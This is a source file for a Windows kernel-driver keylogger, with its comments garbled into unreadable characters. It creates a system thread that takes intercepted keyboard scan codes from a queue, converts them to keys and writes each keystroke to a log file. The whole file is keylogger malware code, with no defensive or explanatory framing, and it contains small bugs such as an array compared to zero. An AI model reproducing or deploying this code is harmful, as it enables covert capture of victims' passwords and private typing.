extern "C"
{
	#include "ntddk.h"
}

#include "ntddkbd.h"
#include "Klog.h"
#include "KbdLog.h"
#include "KbdHook.h"
#include "ScanCode.h"

// �ж�����ȼ� passive
NTSTATUS InitThreadKeyLogger(IN PDRIVER_OBJECT pDriverObject)
{

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	//Ϊ�豸��չ���������߳�
	pKeyboardDeviceExtension->bThreadTerminate = false;

	//���������߳�
	HANDLE hThread;
	NTSTATUS status	= PsCreateSystemThread(&hThread,(ACCESS_MASK)0,NULL,(HANDLE)0,NULL,ThreadKeyLogger,
						pKeyboardDeviceExtension);

	if(!NT_SUCCESS(status))
		return status;

	DbgPrint("Key logger thread created...\n");

	//��ȡ�̶߳����ָ��
	ObReferenceObjectByHandle(hThread,THREAD_ALL_ACCESS,NULL,KernelMode,
		(PVOID*)&pKeyboardDeviceExtension->pThreadObj, NULL);

	DbgPrint("Key logger thread initialized; pThreadObject =  %x\n",
		&pKeyboardDeviceExtension->pThreadObj);

	ZwClose(hThread);

	return status;
}

//�ж�����ȼ�Ϊ passive
VOID ThreadKeyLogger(IN PVOID pContext)
{

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
	PDEVICE_OBJECT pKeyboardDeviceOjbect = pKeyboardDeviceExtension->pKeyboardDevice;

	PLIST_ENTRY pListEntry;
	KEY_DATA* kData;

	//��ѭ���壬�õ���ֵ
	while(true)
	{
		// �ȴ��������ݽ������
		KeWaitForSingleObject(&pKeyboardDeviceExtension->semQueue,Executive,KernelMode,FALSE,NULL);

		pListEntry = ExInterlockedRemoveHeadList(&pKeyboardDeviceExtension->QueueListHead,
												&pKeyboardDeviceExtension->lockQueue);


		if(pKeyboardDeviceExtension->bThreadTerminate == true)
		{
			PsTerminateSystemThread(STATUS_SUCCESS);
		}

		kData = CONTAINING_RECORD(pListEntry,KEY_DATA,ListEntry);

		//ת��ɨ�赽��ֵ
		char keys[3] = {0};
		ConvertScanCodeToKeyCode(pKeyboardDeviceExtension,kData,keys);

		//�жϼ�ֵ�Ƿ�д���ļ�
		if(keys != 0)
		{
			// ������д���ļ�
			if(pKeyboardDeviceExtension->hLogFile != NULL)
                                                        //�ж��ļ��Ƿ���Ч
			{
				IO_STATUS_BLOCK io_status;
				DbgPrint("Writing scan code to file...\n");

				NTSTATUS status = ZwWriteFile(pKeyboardDeviceExtension->hLogFile,NULL,NULL,NULL,
					&io_status,&keys,strlen(keys),NULL,NULL);

				if(status != STATUS_SUCCESS)
						DbgPrint("Writing scan code to file...\n");
				else
					DbgPrint("Scan code '%s' successfully written to file.\n",keys);
			}
		}
	}
	return;
}//ThreadLogKeyboard

